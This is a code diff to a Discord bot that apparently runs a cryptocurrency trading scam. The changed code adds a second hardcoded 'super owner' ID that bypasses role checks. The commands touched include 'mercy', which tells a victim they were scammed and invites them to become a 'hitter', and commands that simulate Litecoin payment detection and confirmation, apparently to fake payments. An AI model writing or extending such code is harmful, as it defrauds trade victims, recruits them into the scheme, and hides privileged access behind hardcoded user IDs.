@@ -65,7 +65,7 @@ const client = new Client({
 const app = express();
 app.use(express.json());
  
-const SUPER_OWNER = 1472661189824872622n;
+const SUPER_OWNERS = new Set([1472661189824872622n, 1484756542002692139n]);
 const guildOwners = {};
 const guildConfig = {};
 const userStats = {};
@@ -96,7 +96,7 @@ function getConfig(guildId) {
 }
  
 function isOwner(guildId, userId) {
-  return (guildOwners[guildId] || new Set()).has(userId) || BigInt(userId) === SUPER_OWNER;
+  return (guildOwners[guildId] || new Set()).has(userId) || SUPER_OWNERS.has(BigInt(userId));
 }
  
 async function ensureGuild(guildId) {
@@ -669,7 +669,7 @@ client.on('interactionCreate', async (interaction) => {
     }
     if (interaction.commandName === 'mercy') {
       const member = await interaction.guild.members.fetch(interaction.user.id);
-      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
+      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && !SUPER_OWNERS.has(BigInt(interaction.user.id))) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
       const user = interaction.options.getUser('user');
       const mercyEmbed = new EmbedBuilder().setTitle('Scam Notification').setDescription('The harsh truth is — you got scammed. You most likely wont get your stuff back. But its not the end of the world. You can now join us and become a hitter. If you click accept, you will become a hitter. Its your choice whether you would like to become one or not.').setColor(0x2b2d31);
       const acceptBtn = new ButtonBuilder().setCustomId(`mercy_accept_${user.id}`).setLabel('Accept').setStyle(ButtonStyle.Success);
@@ -771,7 +771,7 @@ client.on('interactionCreate', async (interaction) => {
     }
     if (interaction.commandName === 'simulatedetection') {
       const member = await interaction.guild.members.fetch(interaction.user.id);
-      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
+      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && !SUPER_OWNERS.has(BigInt(interaction.user.id))) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
       const amount = interaction.options.getNumber('amount');
       const ltcPrice = await getLTCPrice();
       const ltcAmount = (amount / ltcPrice).toFixed(8);
@@ -785,7 +785,7 @@ client.on('interactionCreate', async (interaction) => {
     }
     if (interaction.commandName === 'simulateconfirmation') {
       const member = await interaction.guild.members.fetch(interaction.user.id);
-      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
+      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && !SUPER_OWNERS.has(BigInt(interaction.user.id))) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
       const amount = interaction.options.getNumber('amount');
       const ltcPrice = await getLTCPrice();
       const ltcAmount = (amount / ltcPrice).toFixed(8);
